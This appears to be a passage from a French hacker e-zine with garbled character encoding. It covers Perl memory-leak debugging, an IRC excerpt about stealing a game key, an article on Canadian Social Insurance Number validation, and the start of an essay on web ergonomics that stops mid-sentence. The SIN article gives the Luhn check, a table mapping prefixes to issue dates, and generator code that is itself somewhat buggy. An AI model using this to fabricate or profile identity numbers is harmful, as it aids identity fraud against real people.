21     else if (SvWEAKREF(sv)) {
22         if (ckWARN(WARN_MISC))
23             Perl_warner(aTHX_ packWARN(WARN_MISC), "Reference is already weak");
24         return sv;
25     }
26     tsv = SvRV(sv);
27     sv_add_backref(tsv, sv);
28     SvWEAKREF_on(sv);
29     SvREFCNT_dec(tsv);
30     return sv;
31 }

En dΘbugguant ce code, on s'aperτoit que la variable tied passe α la  ligne  17,  puis  entre 
dans la condition pour finalement exΘcuter la ligne 18. La raison est que notre variable tied 
a les flags suivants : FLAGS = (TEMP,GMG,SMG,RMG).  (Voir   http://gisle.aas.no/perl/illguts/ 
pour des informations additionnelles  α perlguts) Donc, comme le dit le code, la condition 17 
devrait Ωtre vraie  lorsque  la  variable est non dΘfinie, nous indiquant Θgalement - sans le 
mentionner  -  que  les  variables  tied  ne  sont pas gΘrΘes par cette mΘthode. Il  faudrait 
remplacer la ligne 18 par quelchose comme :

if (SvMAGIC(sv)) {
    //***************************************
    //Do something like this without bugs !!!
    //***************************************
    //tsv = SvRV(sv);
    //sv_add_backref(tsv, sv);
    //SvWEAKREF_on(sv);
    //SvREFCNT_dec(tsv);
    //***************************************
} else {
    return sv;
}

Toutefois,  je n'arrive pas α faire fonctionner ce genre de code. J'ai des  problΦmes avec le 
backref. Il semble me manquer des informations primordiales.

+---------------------------------------------------------------------------------------------+
| EOF : Preuve 0x0004 : Assaut final                                                          |
+---------------------------------------------------------------------------------------------+

Ce bug a ΘtΘ soumis α perlbug 
http://rt.perl.org/rt3/Ticket/Display.html?id=34524
et n'a pas ΘtΘ rΘpondu α ce jour.

Nous arrivons α l'immense problΦme o∙ nous ne pouvons pas visualiser  α  tout  coup  que  nos 
variables sont vΘritablement supprimΘs comme il se doit,  uniquement  parce  que le weaken ne 
veut pas fonctionner avec un tie sur la variable.

Pour vraiment savoir si le weaken se fait bien, nous devons α ce jour, enlever  les monitors, 
et  vΘrifier  sur  les  variables  suspectes  s'il  y  a  des  rΘfΘrences  circulaires   avec 
Devel::Monitor::print_circular_ref.

+---------------------------------------------------------------------------------------------+
| Chapitre onze                                                                               |
|                                                                                             |
| Utilisation de Devel::Monitor                                                               |
+---------------------------------------------------------------------------------------------+

Lorsque vous avez dΘtectez des variables non dΘtruites, vous pouvez allez plus  en profondeur 
pour   savoir   o∙   se   situe   la   rΘfΘrence   circulaire   en   utilisant   la   mΘthode 
Devel::Monitor::print_circular_ref

+---------------------------------------------------------------------------------------------+
| Exemple 0x0006 : Utilisation de "print_circular_ref"                                        |
+---------------------------------------------------------------------------------------------+
1  my (@a, @b);
2  $a[0] = 'asdf';
3  $a[1] = \@b;
4  $b[3] = \@b;
5  print_circular_ref(\@a);
6  print_circular_ref(\@b);

+----------------------+
| RΘsultat             |
+----------------------+
-------------------------------------------------------------------------------
Checking circular references for ARRAY(0x814e358)
-------------------------------------------------------------------------------
Internal circular reference found : ARRAY(0x814e358)[1][3] on ARRAY(0x814e370)
1 - Item     : ARRAY(0x814e358)
2 - Source   : [1]
    Item     : ARRAY(0x814e370)
3 - Source   : [3]
    Item     : ARRAY(0x814e370)
-------------------------------------------------------------------------------
-------------------------------------------------------------------------------
Results for ARRAY(0x814e358)
Circular reference          : 0
Internal circular reference : 1
Weak circular reference     : 0
-------------------------------------------------------------------------------
-------------------------------------------------------------------------------
Checking circular references for ARRAY(0x814e370)
-------------------------------------------------------------------------------
Circular reference found : ARRAY(0x814e370)[3]
1 - Item     : ARRAY(0x814e370)
2 - Source   : [3]
    Item     : ARRAY(0x814e370)
-------------------------------------------------------------------------------
-------------------------------------------------------------------------------
Results for ARRAY(0x814e370)
Circular reference          : 1
Internal circular reference : 0
Weak circular reference     : 0
-------------------------------------------------------------------------------

+----------------------+
| Conclusion           |
+----------------------+

Vous pouvez savoir o∙ se situe les rΘfΘrences circulaires et Θgalement savoir  si  elle   est 
dΘjα weakened.

+---------------------------------------------------------------------------------------------+
| EOF : Exemple 0x0006 : Utilisation de "print_circular_ref"                                  |
+---------------------------------------------------------------------------------------------+

+---------------------------------------------------------------------------------------------+
| Chapitre douze                                                                              |
|                                                                                             |
| Impossible d'utiliser les rΘfΘrences des objets tied                                        |
+---------------------------------------------------------------------------------------------+

╔videmment,  encore  des  problΦmes  surviennent  lorsque  vient  le temps  de  vΘrifier  les 
rΘfΘrences  d'un  objet  tied.  L'usage  de ces rΘfΘrences pourraient servir  par  exemple  α 
vΘrifier les rΘfΘrences circulaires en observant si une rΘfΘrence est vu plus d'une fois dans 
un chemin. ╔las, il semble impossible de le faire. Soit le code suivant :

1  my $self = {'a' => 1,
2              'b' => 2};
3  monitor('self' => \$self);
4  print STDERR \($self->{'a'})."\n";
5  print STDERR \($self->{'b'})."\n";
6  print STDERR \($self->{'a'}).\($self->{'b'})."\n";
7  foreach my $key (keys %$self) {
8      my $keyRef = \$key;
9      my $value = $self->{$key};
10     my $valueRef = \($self->{$key});
11     print STDERR "KEY:$key, KEY REF:$keyRef, VALUE:$value, VALUE REF:$valueRef\n";
12 }

+----------------------+
| RΘsultat             |
+----------------------+
MONITOR HASH : self
SCALAR(0x8141384)
SCALAR(0x8141384)
SCALAR(0x8141384)SCALAR(0x81413cc)
KEY:a, KEY REF:SCALAR(0x8141420), VALUE:1, VALUE REF:SCALAR(0x824becc)
KEY:b, KEY REF:SCALAR(0x81413cc), VALUE:2, VALUE REF:SCALAR(0x824becc)
DESTROY HASH : self

+----------------------+
| Explications         |
+----------------------+

Nous  voyons  que les rΘfΘrences sont les mΩmes pour des clΘs de hash diffΘrentes. Il semble 
que le tie me fait chier !!! Mais attendez une minute, est-ce que c'est mon module qui bug ? 
Essayons avec du code plus ΘlΘmentaire :

1  #!/usr/bin/perl
2  use strict;
3  use warnings;
4  use Tie::Hash;
5
6  my %self;
7  tie %self, 'Tie::StdHash';
8  $self{a} = 1;
9  $self{b} = 2;
10 print STDERR \($self{a})."\n";
11 print STDERR \($self{b})."\n";
12 print STDERR \($self{a}).\($self{b})."\n";
13 foreach my $key (keys %self) {
14     my $keyRef = \$key;
15     my $value = $self{$key};
16     my $valueRef = \($self{$key});
17     print STDERR "KEY:$key, KEY REF:$keyRef, VALUE:$value, VALUE REF:$valueRef\n";
18 }

+----------------------+
| RΘsultat             |
+----------------------+
SCALAR(0x101112c8)
SCALAR(0x101112c8)
SCALAR(0x101112c8)SCALAR(0x1016cf8c)
KEY:a, KEY REF:SCALAR(0x10133ca4), VALUE:1, VALUE REF:SCALAR(0x1016cfa4)
KEY:b, KEY REF:SCALAR(0x1016cf8c), VALUE:2, VALUE REF:SCALAR(0x1016cfa4)

+----------------------+
| Conclusion           |
+----------------------+

Les rΘfΘrences d'objets tied sont mauvaises... On ne peut pas s'en servir pour  dΘtecter  des 
rΘfΘrences circulaires... Ceci est vraiment mauvais...

+---------------------------------------------------------------------------------------------+
| Chapitre treize                                                                             |
|                                                                                             |
| Conclusion                                                                                  |
+---------------------------------------------------------------------------------------------+

Si weaken ne me faisait pas de troubles, ce serait vraiment mais vraiment bien.


J'ai les mains liΘs et je ne peux rien faire d'autre que  de  visualiser  les  variables  non 
dΘtruites, puis de dΘtecter les rΘfΘrences circulaires pour  ensuite mettre des weaken. Rendu 
α ce point, je ne peux plus rien faire  d'autre que de m'embarquer dans la science de l'essai 
erreur α savoir si la variable est rΘellement dΘtruite. Je dois α ce jour tester manuellement 
avec mod_perl. Il est rΘellement dommage, qu'aprΦs Ωtre allΘ aussi  loin,  que  je  me  fasse 
arrΩter par le simple weaken. Avoir ΘtΘ dans n'importe quel autre  langage de haut niveau, je 
n'aurais tout simplement pas pu faire ce genre  de chose. Avec Perl, les possibilitΘs Θtaient 
quasi-infinies... Mais voilα qu'il resserre sa corde α mon cou tel un cowboy en furie.

Pour rΘellement rΘgler le problΦme, je devrais aller directement dans le code source de Perl, 
chose que je ne ferai sans doute pas faute de temps.

warn "J'ai faim\n";

+---------------------------------------------------------------------------------------------+
| Chapitre quatorze                                                                           |
|                                                                                             |
| Signature                                                                                   |
+---------------------------------------------------------------------------------------------+

Amoureusement v⌠tre,

nothing94

+---------------------------------------------------------------------------------------------+
| Chapitre quinze                                                                             |
|                                                                                             |
| Post-scriptum                                                                               |
+---------------------------------------------------------------------------------------------+

Si vous trouvez des solutions aux problΦmes ΘnumΘrΘs dans ce texte, faites moi signe.


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |                                                          \\_  \_ \   \\_ M  ; . X
 || |&lt;Zodiac> kkun connais un programme de hackage ni trop     \_ \   \\_  \_ \ K      
 || |basique ni trop avancΘ ? :P                                 \\_  \_ \   \\_ -  : '
 ||`|&lt;Wyzeman> google.ca                                         \_ \   \\_  \_ \ 1   
 || |&lt;Zodiac> ah non c'est trop utilisΘ sa                         \\_  \_ \   \\_ 1  + 
 || |&lt;Wyzeman> c ptete bon signe                                   \_ \   \\_  \_ \ 1   
 ||'|&lt;Zodiac> on ma piker mon jeux de Counter Strike et jveut aller  \\_  \_ \   \\_  x 
 || |chercher la clΘ dans le registre du mec, et par la meme occasion\_ \   \\_  \_ \  `
 || |&lt;Wyzeman> bien sur, et moi jsuis robin des bois ?                 \\_  \_ \   \\_  
 ||,|&lt;Zodiac> non ta raison jdit nimporte koi, jveut seulement         \_ \   \\_  \_ \.
 || |sur le pc d'un copain et ke lui fasse pareil                        \\_  \_ \  _\\_  
/ | |&lt;Wyzeman> jpeu detruire tes illusions tout de suite ?               \_ \   \\_/    \
 / ;|&lt;Zodiac> tu peut te les mettres au cul premierement moi jme casse     \\_  \_       |
  | |de se canal a la con, et t'avise pas de toucher a mon pc              _\ \   /      |
//  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ #hack.fr un endroit ou l'on se soucie de vous                         ]=\:\  |
  \__\__________________________________________________________________________________/





  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O3]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ un affaire de NAS             ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka: un affaire de numero dassurence social nheeeeeeuuuuhhhh!]=\:\    \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[    Nexact    ]=\:\ _//     
                                                  \__\________________________/__/ 


Une affaire de numΘros d'assurance social ... 

L'algorithme Luhn(aussi appelle modulus 10 ou mod10) utiliser pour  gΘnΘrer  des  numΘros  de 
carte qui est maintenant utilisΘe dans le  domaine  public  a  ΘtΘ  developper  en  1960 pour 
la  validation  de  numΘros  unique  par  exemple,  celle  d'une  carte de crΘdit, un  numΘro 
d'assurance social, numΘro d'assurance, ect..

Bref, comme dans presque chaque numΘro gΘnΘrΘ pour Ωtre utilisΘ  dans  le public se cache une 
algorithme voici celle utilisΘe pour savoir la validitΘ d'un numΘroá:

    046 454 286  <  # d'assurance social

    046 454 286  \/  multiplier le haut
    121 212 121  /\  avec ces numΘros.
    -----------
    086 858 276


0*1 = 0  4*2=8  2*1=2
4*2 = 8  5*1=5  8*2=16 <-- 6+1 = 7
6*1 = 6  4*2=8  6*1=6

Si la multiplication de a*b est un digit a 2 chiffres
vous devez les additionner.
ex: 8*2=16 <-- 6+1 = 7 <- ont utilisent ce chiffre.

Maintenant ont additionne le rΘsultat:
0+8+6+8+5+8+2+7+6=50
                  /\
                Si le total est n/10 .. c'est un # valide.
                Sinon, c'est un faux #.

L'analyse d'un numΘroá:
Le premier chiffre ce trouve a Ωtre la province d'enregistration
1 = NB, NF, NS, PE   6 = AB, MB, SK, NT, NU?       
2 = QC               7 = BC, YU                    
3 = mutant de quebec 8 = Not Used                  
4 = ON               9 = Immigrants & # temporaire.
5 = ON               0 = pas utilisΘ              

voilα la fonction pour Θviter de pitonner :]
int valid_number(char *number) {
    int i, n, sum = 0;
    char alternate = 0;

    for (i = strlen(number) - 1; i >= 0; i--) {
        n = number[i] - '0';
        if (alternate) {
            n *= 2;
            if (n > 9)
                n = (n % 10) + 1;
        }
        sum += n;
        alternate = !alternate;
    }

    return (sum % 10 == 0);
}

Plusieurs  personnes  ont  dΘjα  collaborΘ  pour  essayer  d'Θtablir une database .. Mais bon 
celle-ci est incomplΦte ...

le 2ieme et 3ieme chiffre semble Ωtre la date de naissance  voici  une petite table rΘcupΘrer 
dÆhackcanada:

___________________________________________________________________
|(AB)       Alberta  |(BC)British Columb. | (ON)       Ontario    |
|------------------  | ------------------ | --------------------  |
|623     1955-08-08  | 700     1935-08-11 |   404     1941-07     |
|624     1957-08     | 703     1937-01-05 |   409     1943-07-30  |
|624     1957-11     | 704     1941-08-31 |   423     1946-01-24  |
|631     1966-05-31  | 706     1947-09-26 |   425     1946-06     |
|637     1967        | 710     1968       |   443     1953-09     |
|637     1968-10-08  | 720     1963-07-07 |   448     1955-04-01  |
|639     1973-08-19  | 723     1966-07-28 |   448     1955-09-18  |
|640     1968-01-29  | 725     1970       |   452     1956-07     |
|640     1971-08-17  | 726     1972-12    |   457     1958-05-21  |
|642     1972-09-24  | 726     1973-10-12 |   464     1960        |
|642     1974-06-27  | 726     1973-11-19 |   465     1961-03-25  |
|644     1975-01-06  | 726     1974-07-27 |   466     1959-01-27  |
|644     1977-12-01  | 727     1974-12-31 |   467     1961-02-07  |
|645     1976-09-16  | 728     1978-02-15 |   471     1960-11-14  |
|645     1977-02-17  | 728     1978-02-15 |   475     1960-06-28  |
|647     1978-08-17  | 729     1977-01-09 |   479     1973-07     |
|648     1982-04-07  | 729     1977-05-12 |   482     1965-03-28  |
|649     1983-01-08  | 729     1978-07-27 |   486     1970-02-20  |
|650     1981-11-11  | 732     1980-03-05 |   486     1970-10-14  |
|650     1983-01-14  | 733     1982-04-18 |   488     1971-07-21  |
|650     1983-12-20  | 733     1982-05-12 |   490     1962-10-03  |
|651     1981-10-29  | 734     1980-06-29 |   490     1971-01-23  |
|651     1982-10-10  | 734     1982-10-02 |   490     1972-01-03  |
|652     1982-04-24  | 734     1984-12-25 |   493     1972-10-12  |
|653     1984-11-14  | 736     1983-11-01 |   495     1975-09-04  |
|654     1984-01-26  | 736     1984-07-05 |   496     1972-09-03  |
|654     1985-04-21  | 737     1984-09-20 |   496     1975-10-29  |
|657     1986-03-27  | 739     1985-07-17 |   498     1974-11-21  |
|659     1987-08-28  |                    |   498     1975-04-30  |
| --------------------------------------- |   499     1976-09-20  |
|(MB)      Manitoba  | (NB) New Brunswick |   500     1975-10     |
| ------------------ | ------------------ |   503     1977-05-13  |
|600     1941        | 106     1938       |   503     1979-09-20  |
|608     1946-09-10  | 120     1965-12-14 |   505     1979-05     |
|610     1938-12-13  | 121     1965-09-14 |   505     1979-10-01  |
|614     1950-02     | 122     1970-03-14 |   505     1979-10-08  |
|615     1943-01-06  | 123     1968-03-18 |   505     1980-07-23  |
|621     1953-05-23  | 127     1981-12-17 |   505     1980-10-23  |
|622     1954-02-22  | 129     1983-11-22 |   506     1980-09-01  |
|623     1953-01-31  | 128     1985-01-10 |   511     1980-08-20  |
|623     1953-07     |                    |   512     1982-03-07  |
|623     1955-01-22  | (NF)  Newfoundland |   513     1980-09-11  |
|624     1957-11-22  | ------------------ |   514     1981-07-12  |
|625     1957-05-20  | 112     1954       |   514     1983-04-11  |
|628     1960-12-26  | 114     1960-07-23 |   515     1981-05-15  |
|634     1957-07-14  | 126     1977-07-12 |   516     1980-08-09  |
|635     1960-06-07  | 129     1987-04-21 |   516     1981-08-05  |
|635     1964-02-01  |                    |   516     1982-09-30  |
|636     1965-01-13  | (NS)   Nova Scotia |   516     1983-09-15  |
|637     1966-02-09  | ------------------ |   516     1983-10-08  |
|640     1979-12-18  | 113     1965       |   518     1983-05-06  |
|641     1971-10-25  | 119     1964-11-15 |   519     1981-10-16  |
|642     1974-09-04  | 120     1964-08-11 |   520     1984-02-10  |
|643     1974-06-13  | 122     1966-05-05 |   521     1984-11-29  |
|644     1977-10-29  | 123     1971       |   522     1981-11-19  |
|645     1978-10-01  | 124     1975-10-31 |   522     1985-12-05  |
|646     1982-03-07  | 125     1978       |   523     1982-03-17  |
|648     1978-03-15  | 127     1981-12-04 |   525     1982-11-28  |
|648     1978-04-03  | 130     1985-05-12 |   525     1983-07-17  |
|648     1978-09-28  |                    |   525     1985-05-09  |
|649     1984-10-17  | (NT)           NWT |   527     1983-02-24  |
|650     1979-05-14  |--------------------|   528     1984-08-06  |
|650     1979-07-29  | 643     1975-05-16 |   529     1985-02-13  |
|652     1980-12-09  | 643     1975-08-30 |   529     1985-09-06  |
|------------------- | ------------------ |   530     1984-07-24  |
| (PE)           PEI | (QC)        Quebec |   532     1985-02-01  |
| ------------------ | ------------------ |   536     1985-08     |
| 121     1983-05-26 | 227     1949-09-20 |   540     1987-07-08  |
| (SK)  Saskatchewan | 232     1951-10-12 |------------------------
| ------------------ | 233     1951-08-05 |
| 606     1946-02    | 246     1961-04-28 |
| 632     1963       | 252     1963-10    |
| 632     1969-10-11 | 259     1963       |
| 639     1968-11-25 | 270     1973-05-29 |
| 640     1969-12-04 | 271     1975-10-18 |
| 640     1971-11    | 272     1974-06-02 |
| 643     1973       | 273     1977-01-18 |
| 647     1981-08-23 | 274     1978-08-11 |
| 647     1983-11-24 | 276     1980-05    |
| 650     1980-10-21 | 279     1980-05-31 |
| 651     1982-11-24 | 279     1980-09-25 |
| 654     1983-12-02 | 280     1981-10-30 |
| 656     1983-02-06 | 284     1981-10-19 |
| 658     1987-11-17 | 285     1984-05-25 |
|                    | 286     1983-06-04 |
|                    | 289     1984-10-30 |
|                    | 291     1985-07-04 |
|                    | 291     1986-07-27 |
|                    | 291     1986-04-18 |
|                    | 293     1987-07-05 |
------------------------------------------


Bref, ont peux coder un gΘnΘrateur asser facilement..  voici  un  petit  bout  de  code   qui 
pourrait Ωtre utile dans certains de vos projets  en gros, τa gΘnΦre un nick de 9 lettres pis 
la fonction pour vΘrifier s'il est valide

#include &lt;string>   
#include &lt;iostream> 
#include &lt;fstream>  
#include &lt;sstream>  
#include &lt;vector>   
#include &lt;time.h>

using namespace std;

int decryptnick(string nick);
string rndnick();

int main() {
 string nickname;
 srand(time(0));
 cout << "generation d'un nickname:" << endl;
 while(1) {
	nickname = rndnick();                                                                                     
	cout << "checking:" << nickname;                                                                          
	if (decryptnick(nickname) == 0) {
		cout << "<- VALIDE" << endl; break;
	} else { cout << "<- INVALIDE" << endl; }
 }
 	return 0;
}
string rndnick() {
	char nick[10];
	int i = 0,rnd;
	memset(nick, 0, sizeof(nick));
	for (i=0;i<9;i++) {
		rnd = rand()*(4-1)/RAND_MAX+1;
		if (rnd == 1) { nick[i] = rand()*(58-49)/RAND_MAX+49; }
		if (rnd == 2) { nick[i] = rand()*(91-65)/RAND_MAX+65; }
		if (rnd == 3) { nick[i] = rand()*(100-97)/RAND_MAX+97; }
		if (i == 0) { nick[i] = rand()*(91-65)/RAND_MAX+65; }
	}
	nick[9] = '\0';
	string nickname(nick);
	return nickname;
}

int decryptnick(string nick) {
	int total=0,calc=0,i=0;
	stringstream num;
	string no,realno;
	for (i = 0;i < 9;i++) num << (int)nick[i];
	no = num.str();
	for (i = 0;i < 18;i++) if ((i % 2) == 1) { realno += no[i]; } i = 0;                                     
		for (i = 0;i < 9;i++) {
		calc = realno[i] - 48;
		if ((i % 2) == 1) { total += calc; }
		else {
			if ((calc * 2) >= 9) { total += (calc*2-9); }
			else { total += (calc*2); }
		}
	}
	if ((total % 10) == 0) { return 0; }
	else { return 1; }
	return -1;
}

Si jamais vous avez des projets interessant, aek ca, faite moi s'en part ;]
Thx HackCanada :]
                               __   
.-----.-----.--.--.---.-.----.|  |_ 
|     |  -__|_   _|  _  |  __||   _|
|__|__|_____|__.__|___._|____||____|
                             -nexact 





  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  /, `
 \  /   \[:P]/      \_____                                                   ___/    ;
 |\/  '  \__/ . ' ;   |  \____           /:/=[  Info-Pubs  ]=\:\         _____/  x  ` 
 || `  ()            -+-   \____   ________________________   ____ ____   /  ,   . |  ,
 || + .  . ` ; ` : `  | x  ,  :/ _/ , x      ;  '  . .  +  \_ \   \\_ x\_ \      -=+=-
 ||  ____  ____    __     _    // _      '_    ___  ________ \\_` \_ \ _ \\_   .  `| ,
 ||.|                                                        \_ \   \\_  \_ \         `
 || |               La radio 31337 est de retour!              \\_  \_ \   \\_ M  ; . X
 || |                                                          \_ \   \\_  \_ \ K      
 || |   AprΦs de nombreux mois d'absences, init & last font un   \\_  \_ \   \\_ -  : '
 ||`| comming back en force, avec une Θmission de radio leet     \_ \   \\_  \_ \ 1   
 || | qui sera diffusΘe sur Internet α chaque semaine (on va       \\_  \_ \   \\_ 1  + 
 || | essayer entk).                                               \_ \   \\_  \_ \ 1   
 ||'|                                                                \\_  \_ \   \\_  x 
 || |  De plus, tant qu'a faire, on a dΘcidΘ d'en faire un poste     \_ \   \\_  \_ \  `
 || |  de radio complet avec d'autres animateurs, tel que c4ndu,       \\_  \_ \   \\_  
 ||,|  Wyzeman et aOne.                                                \_ \   \\_  \_ \.
 || |                                                                    \\_  \_ \  _\\_  
/ | |  Pour plus d'infos, ou juste pour Θcouter, aller voir le site web! \_ \   \\_/    \
 / ;|         http://radio31337.mindkind.org (mp3 offline disponible)      \\_  \_       |
 /  |__________________  __________   _____     ___     _      _      ___ _\_ \__/       |
 /\_____ ` + . _// ` x ,   ,   `    ; X  `           :      .   -+-  :    ,  \\_/        |
\\_     \_____/  /___________  +  :  .    ,  ` x  ,     " ,   .  `   .   ____\           |
\_ \                        \___________________________________________/                |
  \\_ /:/=[ Radio 31337 de retour cette ΘtΘ! http://radio31337.mindkind.org/      ]=\:\  |
  \__\__________________________________________________________________________________/


  ________________________________________________________________  ____   __   __ 
 /   ___________________________________________________________  ____   __   _  / `
 \  /   \[O4]/ +   ,\_____                                                   ___/ .  `
 |\/   , \__/  .        \____ /:/=[ Un affaire d'ergonomie web    ] =\:\ _____/  `  x
 || ,    .         "   :X  \_______________________________   ____ ____   /    ,  `  `
 ||         +  ,   () .         x  , .           `   '   ` \_ \  ,\\_ +\_ \ 'M  ` |  .
 ||   ` |  `       ,      `   ,         +  ,  ` ,--,   +   . \\_  \_ \ , \\_  K  -+-   
/ |+   -+-    .        ,       `      ,       ,',/ ,'.       \_ \ . \\_  \_ \  -  |   `
 /    . |  ;     +         +  .   `   | :  .  :`` ,_):   '   ` \\_  \_ \   \\_` 1   ,  
 / ` .      .        x          ,  .-=+=-     `. ,. ,'  ` ,    \_ \ + \\_` \_ \  1
 /\_____  x    ' ,      . . X         |   `     `--'  `      `   \\_  \_ \ , \\_  1 +
\\_     \___________________ ,  .  .  ` ,  +  '   ,    , ; x   ._\  \___\\___\  \ .   
\_ \                        \__________________________________/                 \  ` ,
  \\_ /:/=[ Aka:                                                         ]=\:\    \    
  \__\__________________________________________   ______________________________  \`  
                                                \__\                            /__/   
                                                  \\_ /:/=[      h3      ]=\:\ _//     
                                                  \__\________________________/__/ 



	Bon.. j'croyais avoir inventΘ un nouveau  terme..  mais  malheureusement  google  m'a 
ramenΘ α la rΘalitΘ en 0.18 seconde. (plus 20 secondes pour afficher 
la page en 56k :|)

Results 1 - 10 of about 194 for "software ergonomy". (0.18 seconds)

	Encore une fois, mon idΘe est morte dans l'oeuf.. Mais bon, j'me console en me disant 
qu'elle n'Θtait pas si bΩte s'il y a des cours sur l'ergonomie au niveau software.

	Je vois dΘjα les e-mails de programmeurs chevronnΘs me disant;"C'est rien de nouveau, 
c'Θtait le 2ieme chapitre de  mon  livre  de  premiere  session  quand  j'Θtudiais  en  gΘnie 
logiciel..  Bon.. Peut-Ωtre. Mais je n'ai pas ΘtudiΘ en  programmation,  α vrai dire, je n'ai 
mΩme pas ΘtudiΘ en informatique.

	Et c'est vrai, le sujet a surement ΘtΘ mieux traitΘ dans les livres. Je  croyais  que 
mon  idΘe  ne  valait  plus  la  peine d'Θcrire un article, mais en repensant α la faτon dont 
l'idΘe m'est venue, j'ai rΘalisΘ qu'il en valait peut-Ωtre l'effort.

	La premiΦre  question  qui  m'est  venue  α  l'esprit,  c'est pourquoi aprΦs 3 ans de 
programmation php (plus comme passe-temps  que  comme  travail). Je  n'avais  jamais  entendu 
parler d'ergonomie software.. Pourtant, je lis rΘguliΦrement sur des sujets assez avancΘs... 

	En gros, je trouvais que 
l'interaction entre les utilisateurs et les sites webs est souvent  "mal  foutue".  Ca  l'est 
pour les sites web, mais c'est encore plus flagrant losrqu'on utilise des "applications web". 
Avec  le temps, j'ai remarquΘ qu'une application  a  beau  donner  le  rΘsultat  attendu,  si 
l'interaction entre l'utilisateur et le  programme  est  trop  complexe ou trop "mal foutue", 
l'utilisateur en question  cessera de tout simplement de l'utiliser..

	╔videmment, la question est: "Pourquoi l'interaction  sur  le  web  est  si pΘnible?" 
Surtout dans le contexte d'application web  dynamique. La rΘponse est assez simple, mais elle 
met en contexte plusieurs facteurs. Les plus importants sont les suivants:

	- Le protocol HTTP
	- Le manque cruel de standards stables, ΘprouvΘs et surtout 
	  &lt;strong>respectΘs&lt;/strong> au niveau des languages interpretΘs 
	  (de moins en moins vrai avec l'arrivΘe du xhtml strict)
	
	La liste pourrait surement Ωtre plus longue, mais la plupart des problΦmes inhΘrent α 
l'ergonomie software sur le web dΘcoulent surtout du protocol HTTP.  Pour  la simple et bonne 
raison   qu'il  n'a  pas  ΘtΘ  conτu,  pour  gΘrer   un  flot  d'informations  dynamiques  et  
bidirectionnels.  MΩme  le  nom le dit, Hyper  Text Transfert Protocol.. L'idΘe de base Θtait 
de prendre un fichier texte, de le  mettre  sur  un  serveur,  puis  le  serveur  en question 
retourne le contenu du fichier texte  sous  forme  "plain  text".   Seul   un   language   de 
programmation α balises Θtait supporter, le html, dΘrivΘ du SGML (Standard Generalized Markup 
Language) lui mΩme ayant ΘtΘ dΘveloppΘ pour structurer des donnΘes. 

	En tenant compte du but original qui Θtait de formatter et de rendre plus lisible les 
donnΘs du web. Jusque lα le but Θtait plus ou moins  atteint. La o∙ les problΦmes commencent. 
Avec le temps et l'avancement des technologies, les objectifs ont dΘviΘs, malheureusement pas 
toujours dans le bon  sens. Beaucoup d'autres languages ont ΘtΘ ajoutΘs α la longue liste des 
languages supportΘs par le web d'aujourd'hui (voir la tableau 2).  Bref,  le  protocole  HTTP 
transfert maintenant plus de lignes de code que de Texte. 

	L'autre  inconvΘniant  du  protocol  HTTP  est  sa  structure  qui  est basΘe sur des 
requΩtes/rΘponses (qui comprennent les mΘthodes GET/POST), mais qui exige que le  buffer soit 
"flushΘ"  puis  retransfΘrΘ  complΦtement  pour  afficher  le  nouveau  contenu.  Sa    brise 
radicalement la fluiditΘ dans l'utilisation d'un programme web. Les  languages  "client-side" 
comme le javascript ont bien sur ΘtΘ implantΘs pour palier  α  ce manque. C'est bon pour  les 
opΘrations calculables du cotΘ client, mais si une  requΩte  doit Ωtre faite au server et que 
de l'information doit Ωtre reτue et  traitΘe avant d'Ωtre renvoyΘe au client, vous risquez de 
frapper un mur si  vous  ne  voulez pas d'un "refresh". └ moins d'utiliser des mΘthodes assez 
complexes,  comme  une  2ieme  connection entre le server et le client, mais persistante, qui 
gΦre l'interaction entre le "programme web" et sont interface remote.. On  appele ca du RPC*. 
Ce n'est pas, α mon avis, la solution idΘale, car elle comporte beaucoup de faiblesses et est 
relativement complexe α utiliser, car  elle  fait appel α un programme client et un programme 
serveur  qui  communique  ensemble  via  un  autre  port TCP. Alors beaucoup de calculs et de 
processing pour rien, en plus d'avoir α utiliser un port TCP autre que le 80,  donc  qui peut 
Ωtre bloquΘ par un firewall. MalgrΘ cette  perspective  plut⌠t  sombre,  une  solution  vient 
peut-Ωtre Θclairer nos pauvres Γmes de patenteux.. Le " XMLHttpRequest"..  En gros, il   fait 
exactement ce que le RPC tente de faire, mais en Θtant un standards acceptΘ, il sera surement 
beaucoup plus accessible  et stable que le "pseudo RPC". Pour plus d'informations α propos du 
XMLHttpRequest, visitez le  site suivant: 

http://www.xml.com/pub/a/2005/02/09/xml-http-request.html

	Le non respect dΘlibΘrΘ ou non des standards par les  compagnies  qui  produisent les 
fureteurs nous complique aussi incroyablement  la  tΓche.  Souvent  des  dizaines,  voir  des 
